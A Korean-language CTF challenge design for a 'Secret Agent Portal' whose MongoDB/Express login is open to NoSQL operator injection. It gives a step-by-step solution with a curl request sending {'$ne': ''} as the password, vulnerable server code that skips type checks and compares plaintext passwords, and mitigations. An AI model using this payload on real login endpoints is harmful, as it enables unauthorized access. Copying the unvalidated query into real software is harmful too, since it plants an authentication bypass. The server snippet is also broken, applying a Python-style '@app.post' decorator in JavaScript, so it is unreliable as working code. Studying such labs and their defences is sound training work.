---
title: MongoDB NoSQL Injection for Authentication Bypass — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, nosql, mongodb, auth-bypass, json-injection]
confidence: high
---

# MongoDB NoSQL Injection for Authentication Bypass — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Secret Agent Portal (비밀 요원 포털)
- **난이도**: Easy-Medium
- **핵심 컨셉**: 현대 웹 스택의 대표 주자인 Node.js, Express, 그리고 **MongoDB** 환경에서 발생할 수 있는 **NoSQL 인젝션(NoSQLi)** 취약점 문제입니다. 로그인 페이지에서 사용자가 입력한 자격 증명(ID/PW)을 검증할 때, 서버가 입력을 문자열(String) 타입으로 강제 변환하거나 엄격하게 유효성을 검증하지 않고 클라이언트가 제출한 JSON 객체 구조를 쿼리에 그대로 대입합니다. 공격자는 이를 노려 문자열 값이 들어갈 자리에 MongoDB의 쿼리 비교 연산자(`$ne` 등) 객체를 주입하여 패스워드 검증 로직을 참(True)으로 우회하고 관리자 포털에 접속합니다. (picoCTF `NoSqli` 영감)

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Login Interface**: 아이디와 비밀번호를 입력받아 POST 방식으로 `/api/login`에 요청하는 폼.
- **Backend Service (Node.js/Express)**:
  - 데이터베이스로 MongoDB 사용.
  - 로그인 핸들러에서 사용자가 보낸 JSON 본문의 `username`과 `password`를 직접 데이터베이스 조회 API(`db.collection.findOne`)에 바인딩하여 유저 정보를 쿼리함.
- **Flag 위치**:
  - 관리자 계정(`admin`)으로 로그인 성공 시 응답 메시지 혹은 대시보드 메인 화면의 메타데이터에 포함됩니다.

### 2.2 취약점 지점
1. **Unsafe MongoDB Query Binding (Object Injection)**:
   - 개발자가 로그인 기능을 구현할 때, 입력값 형식이 문자열인지 명시적으로 확인하지 않습니다.
   - 예: `db.users.findOne({ username: req.body.username, password: req.body.password })`
   - 클라이언트가 `{"password": {"$ne": ""}}`를 보내면, 쿼리는 `password != ""` 조건을 적용하여 데이터베이스에서 첫 번째 레코드(관리자 계정 등)를 정상적으로 찾아냅니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 (Body JSON) | 반환 값 (Response JSON) | 비고 |
|------------|--------|------|--------------------|------------------------|------|
| `/login` | GET | 없음 | 없음 | 로그인 폼 HTML | |
| `/api/login`| POST | 없음 | `{"username": "...", "password": "..."}` | `{"status": "success", "token": "...", "flag": "..."}` | NoSQL 인젝션 및 로그인 우회 대상 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 정상 로그인 패킷 구조 파악
개발자 도구 및 프록시를 통해 로그인 버튼 클릭 시 전송되는 요청 본문의 포맷을 파악합니다.
- *정상 요청*:
  ```http
  POST /api/login HTTP/1.1
  Host: portal.challenge.local
  Content-Type: application/json

  {"username": "user1", "password": "password123"}
  ```
- *정상 응답*:
  ```json
  {"status": "failed", "reason": "Invalid credentials"}
  ```

### Step 2. NoSQL 비교 연산자 공격 페이로드 설계
공격자는 일반적인 SQLi 문자열 특수기호(`' OR 1=1 --`) 대신, JSON 데이터를 직접 수정하여 MongoDB의 연산자를 대입합니다.
- **목표**: 패스워드 검증 조건을 항상 참으로 만듭니다.
- **연산자 주입 설계**:
  `password` 자리에 문자열이 아닌 비교 객체를 삽입합니다.
  - `$ne`: Not Equal (같지 않음)
  - 페이로드 형태: `{"$ne": ""}` 또는 `{"$ne": null}`
  - 공격용 JSON 완성형:
    ```json
    {
      "username": "admin",
      "password": {"$ne": ""}
    }
    ```

### Step 3. 공격 요청 전송 및 인증 우회
공격자는 JSON 페이로드를 POST 요청 바디에 실어 `/api/login`으로 전송합니다.
- *공격 수행 (curl 예시)*:
  ```bash
  curl -X POST http://portal.challenge.local/api/login \
       -H "Content-Type: application/json" \
       -d '{"username": "admin", "password": {"$ne": ""}}'
  ```

### Step 4. 백엔드 동작 및 플래그 획득
서버는 데이터베이스 쿼리를 수행합니다.
- *실제 구동되는 MongoDB 쿼리*:
  `db.users.findOne({ username: "admin", password: { $ne: "" } })`
- *데이터베이스 처리 결과*:
  `admin` 사용자 중 패스워드가 빈 문자열(`""`)이 아닌 사용자를 탐색하여, 조건이 일치하므로 admin 유저 객체를 반환합니다.
- *서버 응답 결과*:
  인증이 성공하며 로그인 결과와 함께 응답 바디에 진짜 플래그가 전송됩니다.
  ```json
  {
    "status": "success",
    "role": "admin",
    "flag": "FLAG{nosql_mongodb_ne_operator_bypass_authorized}"
  }
  ```

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js Express)

```javascript
// server.js (Express & MongoDB 예시)
const express = require('express');
const { MongoClient } = require('mongodb');
const app = express();

app.use(express.json()); // JSON 파싱 미들웨어

let db;
MongoClient.connect('mongodb://localhost:27017/secret_db', { useUnifiedTopology: true })
    .then(client => {
        db = client.db('secret_db');
        console.log("Connected to MongoDB");
    });

@app.post("/api/login", async (req, res) => {
    // 취약점 핵심 지점: 
    // req.body.username과 req.body.password의 데이터 타입(String 여부)을 검증하지 않음.
    // 사용자가 {"password": {"$ne": ""}}를 제출하면 문자열이 아닌 Object 타입 그대로 db로 전송됨.
    const userQuery = {
        username: req.body.username,
        password: req.body.password
    };
    
    try {
        const user = await db.collection('users').findOne(userQuery);
        
        if (user) {
            return res.json({
                status: "success",
                role: user.role,
                flag: "FLAG{nosql_mongodb_ne_operator_bypass_authorized}"
            });
        } else {
            return res.status(401).json({ status: "failed", reason: "Invalid credentials" });
        }
    } catch (err) {
        return res.status(500).json({ status: "error", message: err.message });
    }
});

app.listen(8080, () => console.log("Server running on port 8080"));
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **입력 값 타입 강제 변환 및 검증 (Type Casting / Sanitization)**:
   - 쿼리에 사용하기 전 사용자 입력값이 문자열 타입(String)이 맞는지 명시적으로 확인하고 변환합니다.
   - **수정 예시**:
     ```javascript
     const username = String(req.body.username || '');
     const password = String(req.body.password || '');
     
     const userQuery = { username, password }; // Object 주입 위협 해소
     ```
2. **Schema 유효성 검사 라이브러리 연동**:
   - `Mongoose` 스키마 밸리데이터를 사용하거나 `Joi`, `Zod` 등의 유효성 검증 프레임워크를 사용하여 정의된 타입 스키마(예: String 타입만 허용)를 반드시 강제합니다.
3. **연산자 비활성화 설정**:
   - 쿼리 라이브러리나 미들웨어 수준에서 입력값 내에 포함된 특수 연산 키(예: `$`로 시작하는 모든 키)를 재귀적으로 제거(Sanitize)해 주는 라이브러리(예: `express-mongo-sanitize`)를 사용합니다.
